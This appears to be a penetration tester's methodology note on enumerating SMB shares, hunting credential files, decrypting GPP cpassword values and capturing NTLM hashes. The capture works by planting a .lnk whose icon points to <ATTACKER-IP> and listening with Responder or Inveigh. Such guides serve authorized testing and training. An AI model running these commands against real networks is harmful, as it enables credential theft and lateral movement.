# SMB Share Enumeration & File Discovery

## Objective

Enumerate all accessible SMB shares using every set of credentials obtained during the assessment. Misconfigured shares often expose sensitive files, credentials, Group Policy Preferences (GPP), scripts, backups, or writable locations that can be leveraged for further compromise.

---

## 1. Enumerate SMB Shares

Whenever you obtain new credentials, enumerate the available SMB shares.

```bash
nxc smb <TARGET_IP> -u <USER> -p <PASSWORD> --shares
```

### Using NTLM Hashes

```bash
nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH> --shares
```

> **Note:** Every newly discovered user may have access to different shares.

---

## 2. Enumerate Every Accessible Share

Do not ignore default shares—they often contain valuable information.

Check:

- `SYSVOL`
- `NETLOGON`
- `IPC$`
- `ADMIN$` (if accessible)
- `C$` (if accessible)
- All custom/non-default shares

Connect to a share:

```bash
smbclient //<TARGET_IP>/<SHARE_NAME> -U <USER>
```

---

## 3. Recheck Shares for Every New User

Whenever new credentials are obtained:

- Re-enumerate accessible shares.
- Compare access permissions.
- Look for newly accessible directories and files.

> Different users frequently have access to different departmental or administrative shares.

---

## 4. Search for Interesting Files

Look for:

- Passwords
- Configuration files
- Backup files
- Scripts
- SSH keys
- Database exports
- Private keys
- Documentation
- Scheduled task files
- `.kdbx` (KeePass)
- `.ps1`, `.bat`, `.vbs`
- `.config`, `.ini`, `.xml`
- `.rdp`
- `.ovpn`
- `.pem`, `.pfx`, `.p12`

---

## 5. Check for Group Policy Preferences (GPP)

Inspect the `SYSVOL` share for Group Policy Preference files containing encrypted credentials.

Common location:

```text
SYSVOL\<DOMAIN>\Policies\
```

Search for:

```text
Groups.xml
Services.xml
ScheduledTasks.xml
Drives.xml
DataSources.xml
Printers.xml
```

If a `cpassword` value is discovered:

```bash
gpp-decrypt <CPASSWORD>
```

> **Purpose:** Recover plaintext credentials stored in legacy Group Policy Preferences.

---

## 6. Identify Writable Shares

Determine whether the current user has write access.

```bash
nxc smb <TARGET_IP> -u <USER> -p <PASSWORD> --shares
```

Alternatively, upload a test file:

```bash
smbclient //<TARGET_IP>/<SHARE_NAME> -U <USER>
```

Inside the SMB session:

```text
put test.txt
```

If successful, the share is writable.

---

## 7. Check for NTLM Hash Theft Opportunities (Old Method)

If a writable share is accessible, determine whether users or services regularly browse the share.

Create a malicious shortcut (`.lnk`) or other file that references an attacker-controlled SMB server and monitor for incoming NTLM authentication.

```bash
#This command will create a shortcut (.lnk) file in the writable share

nxc smb <TARGET-IP> -u <USER> -p <PASSWORD> -M slinky -o SERVER=<ATTACKER-IP> NAME=<LNK-NAME>
```


Example Responder command:

```bash
sudo responder -I <INTERFACE>
```

> **Purpose:** Capture NTLM authentication attempts when a user accesses the malicious file.

> **Note:** Only perform this technique when explicitly permitted by the engagement scope.

---

## NTLM Capture via Writable SMB Shares (Improved Method)

If a writable SMB share is discovered, determine whether it can be abused to capture NTLM authentication.

### Monitor for Authentication

Linux:

```bash
sudo responder -I <INTERFACE>
```

Windows:

```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y
```

### Deploy a Malicious Shortcut

Create a `.lnk` file whose **icon** points to an attacker-controlled SMB share.

> Windows Explorer retrieves shortcut icons while rendering the directory, which can trigger NTLM authentication without the user opening the shortcut.

### Verify

- Wait for users or automated processes to browse the share.
- Monitor for captured NetNTLMv2 hashes.
- If no authentication is received, confirm the share is actively accessed and continue monitoring.

> **Tip:** The most reliable technique is to abuse **icon loading** rather than relying on users to open files.

---

## Tips

- Re-enumerate shares every time new credentials are obtained.
- Never ignore default shares such as `SYSVOL`, `NETLOGON`, or `IPC$`.
- Always inspect GPP files for `cpassword` values.
- Download interesting files for offline analysis.
- Writable shares can enable lateral movement, file replacement, or NTLM credential capture.
- Don't assume users will execute files—Windows Explorer itself may trigger authentication while rendering shortcut icons.
- If no authentication is received immediately, monitor for scheduled or periodic access to the share.
- Test both Responder (Linux) and Inveigh (Windows) depending on your foothold.

---

## Checklist

- [ ] Enumerate SMB shares using every new credential.
- [ ] Inspect all default and custom shares.
- [ ] Recheck shares after obtaining additional users.
- [ ] Search for passwords, backups, scripts, and configuration files.
- [ ] Inspect `SYSVOL` for Group Policy Preference files.
- [ ] Decrypt any discovered `cpassword` values.
- [ ] Identify writable shares.
- [ ] Assess writable shares for NTLM hash capture opportunities.
